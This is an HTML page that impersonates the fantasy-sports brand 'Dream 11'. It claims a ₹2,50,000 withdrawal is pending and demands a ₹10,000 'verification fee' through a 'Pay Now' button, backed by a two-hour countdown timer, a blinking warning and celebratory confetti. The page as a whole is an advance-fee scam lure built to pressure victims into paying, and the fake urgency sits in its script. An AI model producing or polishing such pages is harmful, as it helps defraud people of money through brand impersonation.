<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Withdrawal Payment</title>
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #d90429; /* Red background */
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      height: 100vh;
      overflow: hidden;
    }

    .header {
      font-size: 36px;
      font-weight: bold;
      color: white;
      margin-top: 20px;
      margin-bottom: 10px;
      animation: fadeDown 1s ease-in-out;
    }

    @keyframes fadeDown {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .container {
      background-color: #ffffff;
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 12px 24px rgba(0, 0, 0, 0.2);
      text-align: center;
      max-width: 420px;
      width: 90%;
      animation: fadeIn 1s ease-in-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    h1 {
      color: #2c3e50;
      font-size: 28px;
      margin-bottom: 20px;
    }

    p {
      font-size: 18px;
      color: #555;
      margin-bottom: 30px;
    }

    .btn {
      background: linear-gradient(to right, #28a745, #218838);
      color: #fff;
      padding: 14px 28px;
      font-size: 16px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      text-decoration: none;
      transition: transform 0.2s, box-shadow 0.3s;
    }

    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
    }

    #countdown {
      margin-top: 20px;
      font-size: 16px;
      color: #d63031;
      font-weight: bold;
    }

    .blink {
      animation: blinker 1s linear infinite;
    }

    @keyframes blinker {
      50% { opacity: 0; }
    }

    .expired {
      color: red;
      font-weight: bold;
      margin-top: 25px;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <div class="header">Dream 11</div>

  <div class="container">
    <h1>Withdrawal Pending</h1>
    <p>Your withdrawal of ₹2,50,000 is pending. Please complete the verification fee of ₹10,000 to proceed.</p>
    <a id="payBtn" class="btn" href="" target="_blank">Pay Now</a>
    <div id="countdown"></div>
    <div id="expiredMessage" class="expired" style="display:none;">Link Expired</div>
  </div>

  <script>
    // Countdown logic
    const countdownDuration = 2 * 60 * 60 * 1000;
    let endTime = localStorage.getItem('withdrawalEndTime');

    if (!endTime) {
      endTime = Date.now() + countdownDuration;
      localStorage.setItem('withdrawalEndTime', endTime);
    } else {
      endTime = parseInt(endTime);
    }

    function updateCountdown() {
      const now = Date.now();
      const distance = endTime - now;

      if (distance <= 0) {
        clearInterval(timer);
        document.getElementById('payBtn').style.display = 'none';
        document.getElementById('countdown').style.display = 'none';
        document.getElementById('expiredMessage').style.display = 'block';
        localStorage.removeItem('withdrawalEndTime');
        return;
      }

      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((distance % (1000 * 60)) / 1000);

      const countdownText = `Link expires in ${hours}h ${minutes}m ${seconds}s`;
      const countdownElement = document.getElementById('countdown');
      countdownElement.innerHTML = countdownText;

      if (distance <= 5 * 60 * 1000) {
        countdownElement.classList.add('blink');
      }
    }

    updateCountdown();
    const timer = setInterval(updateCountdown, 1000);

    // Confetti when page loads
    window.onload = () => {
      confetti({
        particleCount: 150,
        spread: 70,
        origin: { y: 0.6 },
      });
    };
  </script>
</body>
</html>
